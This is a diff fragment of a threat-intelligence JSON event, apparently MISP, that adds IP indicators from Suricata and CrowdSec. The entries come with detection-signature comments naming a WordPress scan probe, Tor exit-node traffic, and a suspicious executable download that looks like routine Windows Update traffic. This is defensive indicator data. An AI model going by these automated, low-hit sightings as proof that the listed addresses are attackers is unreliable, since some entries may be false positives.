+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "11",
+            "name": "mwl:cloud=\"gcp\"",
+            "colour": "#fb8535",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "f7ef15f9-1dff-43f3-80eb-cc474e495b7a",
+        "distribution": "5",
+        "timestamp": "1777294825",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T11:16:27Z | last_seen: 2026-04-27T11:16:27Z | hits: 4 | AS14061 DIGITALOCEAN-ASN - DigitalOcean (143.198.16.0/20) | scenarios: suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML | payloads: GET /wordpress/wp-includes/wlwmanifest.xml",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "143.198.26.42",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "dc843a6b-18ba-46ad-b950-46e67d1c5170",
+        "distribution": "5",
+        "timestamp": "1777294825",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T11:47:24Z | last_seen: 2026-04-27T11:47:24Z | hits: 3 | AS214503 R0CKET-CLOUD - QuxLabs AB (45.84.107.0/24) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 111",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "45.84.107.198",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "6b4f8b72-7041-444f-8c87-4deb134f2cae",
+        "distribution": "5",
+        "timestamp": "1777294826",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T11:48:01Z | last_seen: 2026-04-27T11:48:01Z | hits: 3 | AS214503 R0CKET-CLOUD - QuxLabs AB (45.84.107.0/24) | scenarios: suricata/ET TOR Known Tor Exit Node Traffic group 112",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "45.84.107.97",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "13",
+            "name": "tor:exit-node",
+            "colour": "#3f0f0c",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "df622e47-acae-40f9-91e2-fd74cf4f03c8",
+        "distribution": "5",
+        "timestamp": "1777294827",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T12:23:10Z | last_seen: 2026-04-27T12:23:10Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.307.0_2587be0d8d937a891b641f39958748a24d27f782.exe?cacheHostOrigin=3.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.19",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       }
     ],
     "Galaxy": [],
@@ -3460,6 +6854,34 @@
         "id": "6",
         "name": "crowdsec-feed",
         "colour": "#339c19",
+        "exportable": true,
+        "user_id": "0",
+        "hide_tag": false,
+        "numerical_value": null,
+        "is_galaxy": false,
+        "is_custom_galaxy": false,
+        "local_only": false,
+        "local": false,
+        "relationship_type": null
+      },
+      {
+        "id": "7",
+        "name": "source:crowdsec",
+        "colour": "#8f8fbf",
+        "exportable": true,
+        "user_id": "0",
+        "hide_tag": false,
+        "numerical_value": null,
+        "is_galaxy": false,
+        "is_custom_galaxy": false,
+        "local_only": false,
+        "local": false,
+        "relationship_type": null
+      },
+      {
+        "id": "9",
+        "name": "source:suricata",
+        "colour": "#99cd0a",
         "exportable": true,
         "user_id": "0",
         "hide_tag": false,
